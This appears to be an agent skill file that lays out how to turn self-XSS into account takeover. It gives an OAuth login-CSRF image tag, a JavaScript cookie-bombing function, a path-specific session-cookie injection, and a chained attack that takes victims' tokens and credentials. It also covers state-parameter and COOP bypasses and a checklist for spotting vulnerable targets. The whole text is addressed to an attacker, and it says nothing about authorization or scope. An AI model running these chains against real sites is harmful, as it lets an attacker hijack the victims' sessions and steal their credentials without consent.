---
name: self-xss-escalation
description: "Escalate self-XSS to full-impact XSS via login CSRF, cookie bombing, path-specific cookie precedence, and double-XSS chains. Use when you have XSS that only fires in the attacker's own session."
---

# Self-XSS Escalation

You found XSS but it only triggers in your own authenticated session -- the payload is tied to your account data. This skill turns self-XSS into full account takeover.

## Technique 1: OAuth Login CSRF

Force the victim's browser into the attacker's session, where the XSS payload is waiting.

```
Step 1: Start OAuth flow for attacker account, capture authorization code
        (Burp/Caido intercept the callback redirect)

Step 2: Force victim to consume the code:
        <img src="https://target.com/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE">

Step 3: Victim is now logged in as attacker; self-XSS payload fires
```

**State parameter bypass:**
- Check if `state` is tied to session or just a CSRF token
- If in a cookie, set it via cookie injection (XSS on subdomain, cookie tossing)
- Some apps only validate presence, not value
- Some apps skip validation entirely on the callback endpoint

**Token/code lifetime:** OAuth codes are typically single-use, expire in 60s-600s. Move fast.

## Technique 2: Cookie Bombing for Forced Logout

Set enough cookies to exceed the server's header size limit (typically 8KB-16KB), causing 431 errors.

```javascript
function cookieBomb(path) {
  for (let i = 0; i < 100; i++) {
    document.cookie = `bomb${i}=${'A'.repeat(4000)}; Path=${path}; Domain=.target.com`;
  }
}
cookieBomb('/');
```

| Server | Default header limit |
|--------|---------------------|
| nginx | 8KB |
| Apache | 8KB |
| IIS | 16KB |
| Node.js | 16KB |

## Technique 3: Path-Specific Cookie Precedence

When multiple cookies share the same name, the browser sends the most-specific `Path` first. Most servers read the first value.

```javascript
// From XSS on subdomain or any same-site context
document.cookie = `session=${ATTACKER_TOKEN}; Path=/app/vulnerable-page; Domain=.target.com`;
// Victim visits /app/vulnerable-page -> attacker's session cookie sent first
```

## Technique 4: The Double-XSS Chain

```
Phase 1: SETUP
  Store XSS payload in attacker's account
  Capture OAuth code for attacker's account

Phase 2: FORCE LOGIN (victim visits exploit page)
  Cookie bomb victim's session -> 431 errors
  Login CSRF with attacker's OAuth code
  OR: Set path-specific attacker cookie

Phase 3: XSS FIRES
  Victim loads page with attacker's payload
  Payload exfiltrates: localStorage tokens, cookies from other paths,
  IndexedDB credentials, or performs actions as victim via fetch()
```

## COOP Blocking

If `Cross-Origin-Opener-Policy: same-origin` is set, the exploit page loses window references after navigation. Bypasses:
- Redirect-based flow (`<meta http-equiv="refresh">` or form auto-submit)
- Cookie bombing and login CSRF work via `<img src>`, `<iframe>`, or `fetch()` fire-and-forget
- COOP only applies to top-level documents opened via `window.open()`

## Detection Checklist

- [ ] Self-XSS exists (stored payload renders in attacker's own session)
- [ ] OAuth login flow present
- [ ] OAuth callback lacks `state` validation or `state` is predictable/injectable
- [ ] No re-authentication prompt after session change
- [ ] SameSite cookie attribute is Lax (not Strict)
- [ ] Multiple subdomains exist (cookie tossing surface)
- [ ] COOP header is absent or `unsafe-none`

## Related Skills

- **cspt-xss** -- CSPT as the self-XSS primitive being escalated
- **oauth-flow-hijack** -- Code capture techniques for login CSRF
- **csp-bypass** -- If CSP blocks the XSS payload execution
